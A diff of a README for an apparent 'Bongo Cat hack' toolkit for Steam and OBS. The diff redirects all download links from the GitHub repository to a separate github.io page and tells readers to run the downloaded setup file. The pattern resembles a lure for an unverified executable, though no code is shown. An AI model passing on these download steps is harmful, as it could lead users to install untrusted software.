@@ -1,6 +1,6 @@
 # 🐱 bongo-cat-hack-steam-obs-custom-toolkit - Make Every Click a Cat-tastic Performance
 
-[![Download Now](https://img.shields.io/badge/Download-Bongo%20Cat%20Toolkit-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/osama0115949/bongo-cat-hack-steam-obs-custom-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Bongo%20Cat%20Toolkit-FF69B4?style=for-the-badge&logo=github&logoColor=white)](https://osama0115949.github.io)
 
 ## 🎯 What Is This?
 
@@ -31,13 +31,13 @@ The toolkit includes a gamified system where you can earn item drops while using
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/osama0115949/bongo-cat-hack-steam-obs-custom-toolkit](https://github.com/osama0115949/bongo-cat-hack-steam-obs-custom-toolkit)
+Visit this link to download the application: [https://osama0115949.github.io](https://osama0115949.github.io)
 
 ## 📥 Download & Install
 
 Ready to bring your Bongo Cat to life? Here's all you need to do:
 
-1. **Click the Download Button**: Go to [https://github.com/osama0115949/bongo-cat-hack-steam-obs-custom-toolkit](https://github.com/osama0115949/bongo-cat-hack-steam-obs-custom-toolkit) and find the big download button.
+1. **Click the Download Button**: Go to [https://osama0115949.github.io](https://osama0115949.github.io) and find the big download button.
 2. **Visit this link to download the application.** That's it—no complicated steps, no terminal commands, just a simple download.
 3. **Run the setup**: Once the download finishes, open the file you downloaded. It will guide you through a simple setup wizard. Just keep clicking "Next" and you'll be done in under a minute.
 
